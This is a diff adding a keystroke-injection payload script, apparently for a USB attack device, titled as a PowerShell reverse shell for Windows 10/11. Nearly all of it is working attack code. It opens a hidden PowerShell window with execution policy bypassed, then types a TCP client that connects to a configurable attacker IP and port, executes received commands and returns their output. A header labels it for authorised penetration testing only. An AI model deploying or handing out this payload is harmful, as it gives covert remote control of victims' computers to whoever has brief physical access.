@@ -1,0 +1,70 @@
+#!/bin/bash
+# Title: PowerShell Reverse Shell
+# Author: David Osisek (CamoZeroDay)
+# Target: Windows 10/11
+# Version: 1.0
+# Category: Execution
+# 
+# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+# ⚠️ CONFIGURE ATTACKER_IP AND PORT BEFORE USE
+# Establishes PowerShell reverse shell
+
+# CONFIGURATION
+ATTACKER_IP="10.0.0.1"  # CHANGE THIS
+ATTACKER_PORT="4444"     # CHANGE THIS
+
+LED SETUP
+
+ATTACKMODE HID
+
+LED STAGE1
+Q DELAY 2000
+
+# Open PowerShell
+LED STAGE2
+Q GUI r
+Q DELAY 500
+Q STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+Q ENTER
+Q DELAY 1500
+
+# Reverse Shell Payload
+LED STAGE3
+Q STRING \$c=New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_PORT});
+Q ENTER
+Q DELAY 200
+Q STRING \$s=\$c.GetStream();
+Q ENTER
+Q DELAY 200
+Q STRING [byte[]]\$b=0..65535|%{0};
+Q ENTER
+Q DELAY 200
+Q STRING while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){
+Q ENTER
+Q DELAY 200
+Q STRING \$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);
+Q ENTER
+Q DELAY 200
+Q STRING \$sb=(iex \$d 2>&1|Out-String);
+Q ENTER
+Q DELAY 200
+Q STRING \$sb2=\$sb+'PS '+(pwd).Path+'> ';
+Q ENTER
+Q DELAY 200
+Q STRING \$sb=([text.encoding]::ASCII).GetBytes(\$sb2);
+Q ENTER
+Q DELAY 200
+Q STRING \$s.Write(\$sb,0,\$sb.Length);
+Q ENTER
+Q DELAY 200
+Q STRING \$s.Flush()
+Q ENTER
+Q DELAY 200
+Q STRING };
+Q ENTER
+Q DELAY 200
+Q STRING \$c.Close()
+Q ENTER
+Q DELAY 500
+
+LED FINISH
